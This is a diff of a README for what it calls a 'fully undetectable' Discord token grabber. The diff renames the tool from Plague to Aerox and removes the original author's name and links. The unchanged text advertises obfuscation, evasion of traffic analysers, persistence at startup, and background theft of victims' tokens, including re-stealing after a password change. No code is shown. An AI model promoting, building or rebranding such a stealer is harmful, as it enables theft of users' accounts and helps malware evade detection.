@@ -6,14 +6,14 @@
 
 -----
 
-### <p align="center">☣️ Plague ☣️</p>
+### <p align="center">☣️ Aerox ☣️</p>
 
 <br><br>
 <p align="center">
 <strong>
-Plague is a FUD (fully undetectable) Discord token grabber written in Python3, obfuscated with <a href="https://github.com/billythegoat356/Kramer">Kramer</a>, protected from traffic analysers with
+Aerox is a FUD (fully undetectable) Discord token grabber written in Python3, obfuscated with Kramer, protected from traffic analysers with
 <br>
-<a href="https://github.com/billythegoat356/Scarecrow">Scarecrow</a> and using the <a href="https://github.com/billythegoat356/Riot">Riot</a> token grabber, which moves himself
+Scarecrow and using the Riot token grabber, which moves himself
 <br>
 to the computer startup, and token grabs the victim in background, sending the new token if the password is changed.
 <br><br><br>
@@ -84,4 +84,4 @@ to the computer startup, and token grabs the victim in background, sending the n
 
 -----
 
-### <p align="center">billythegoat356</p>
+### <p align="center">Aerox</p>
